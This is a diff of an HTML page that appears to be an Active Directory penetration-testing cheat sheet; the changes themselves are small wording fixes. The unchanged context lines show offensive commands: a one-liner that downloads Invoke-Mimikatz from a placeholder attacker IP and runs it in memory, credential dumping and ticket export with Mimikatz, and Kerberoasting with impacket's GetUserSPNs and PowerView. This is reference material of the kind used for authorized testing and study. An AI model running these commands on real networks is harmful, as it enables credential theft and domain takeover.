@@ -964,7 +964,7 @@ sekurlsa::tickets<span class="w"> </span>/export
 <p>Use PowerSploit's <code>Invoke-Mimikatz.ps1</code> script to run mimikatz in memory:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="n">-UseBasicParsing</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">attacker</span> <span class="n">ip</span><span class="p">&gt;/</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="c">#D ump credentials on a local machine.</span>
+<div class="highlight"><pre><span></span><code><span class="c"># Dump credentials on a local machine.</span>
 <span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span>
 
 <span class="c"># Dump credentials on multiple remote machines</span>
@@ -1073,21 +1073,21 @@ list_tokens<span class="w"> </span>-g
 <span class="c"># AD Module</span>
 <span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-ne</span> <span class="s2">"$null"</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span>
 </code></pre></div>
-<p>Find an SPN account(s) using impacket's <code>GetUserSPNs</code> script:</p>
+<p>Find a SPN  using impacket's <code>GetUserSPNs</code> script:</p>
 <div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;
 
-<span class="c1"># Directly request for each found SPN account the TGS (so skip next command)</span>
+<span class="c1"># Directly request for each found SPN the TGS (so skip next command)</span>
 python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request<span class="w"> </span>
 </code></pre></div>
-<p>Request TGS for the found SPN account(s):</p>
+<p>Request TGS for the specified SPN:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
 <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">"&lt;target SPN&gt;"</span>
 
 <span class="c"># or with PowerView</span>
 <span class="nb">Request-SPNTicket</span>
 </code></pre></div>
-<p>Request TGS for the found SPN account(s) using impacket's <code>GetUserSPNs</code>:</p>
-<div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request-user<span class="w"> </span>&lt;found<span class="w"> </span>SPN<span class="w"> </span>account&gt;
+<p>Request TGS for the found SPN using impacket's <code>GetUserSPNs</code>:</p>
+<div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request-user<span class="w"> </span>&lt;SPN&gt;
 </code></pre></div>
 <p>List tickets in memory:</p>
 <div class="highlight"><pre><span></span><code>klist
